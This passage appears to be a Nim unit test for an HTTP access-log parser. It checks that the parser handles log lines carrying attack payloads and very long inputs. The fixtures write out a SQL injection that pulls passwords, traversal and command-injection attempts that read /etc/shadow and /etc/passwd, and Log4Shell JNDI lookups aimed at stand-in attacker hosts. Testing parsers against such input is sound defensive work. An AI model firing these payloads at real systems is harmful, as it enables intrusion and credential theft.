      # SQL injection
      ("192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"GET /users?id=1' UNION SELECT 1,username,password FROM users-- HTTP/1.1\" 200 500 \"-\" \"sqlmap/1.7\"",
       "UNION SELECT"),
      # Directory traversal
      ("10.0.0.5 - - [10/Oct/2026:13:55:36 +0000] \"GET /../../../../etc/shadow HTTP/1.1\" 403 0 \"-\" \"curl/7.88\"",
       "/etc/shadow"),
      # Command injection with shell metacharacters
      ("172.16.0.2 - - [10/Oct/2026:13:55:36 +0000] \"POST /cgi-bin/status.sh?cmd=;id;cat%20/etc/passwd HTTP/1.1\" 404 12 \"-\" \"Mozilla/5.0\"",
       ";id;cat"),
      # JNDI log4shell
      ("198.51.100.4 - - [10/Oct/2026:13:55:36 +0000] \"GET /${jndi:ldap://evil.attacker.com/exploit} HTTP/1.1\" 400 0 \"-\" \"${jndi:dns://bad.com}\"",
       "${jndi:ldap://"),
      # Null byte and ANSI escapes
      ("203.0.113.8 - - [10/Oct/2026:13:55:36 +0000] \"GET /admin\x00secret HTTP/1.1\" 404 0 \"-\" \"Terminal\x1B[31mExploit\x1B[0m\"",
       "/admin\\0secret")
    ]

    for (line, expectedFragment) in payloads:
      var entry: HttpLogEntry
      check parseCombinedLine(line, entry)
      check entry.path.contains(expectedFragment)
      check not entry.path.contains('\0') # Null bytes sanitized
      check not entry.userAgent.contains('\x1B') # ANSI escapes sanitized

  test "Item 05: Successfully parses extremely long lines without buffer overflow":
    let hugePath = "/search?query=" & repeat("A", 30_000) & "&filter=" & repeat("B", 20_000)
    let hugeUa = "CustomScanner/" & repeat("X", 10_000)
    let hugeLine = "192.168.1.99 - - [10/Oct/2026:13:55:36 +0000] \"GET " & hugePath & " HTTP/1.1\" 414 0 \"-\" \"" & hugeUa & "\""
    
    check hugeLine.len > 60_000

    var entry: HttpLogEntry
    check parseCombinedLine(hugeLine, entry)
    check entry.clientIp == "192.168.1.99"
    check entry.statusCode == 414
    check entry.path.len > 50_000
    check entry.userAgent.len > 10_000




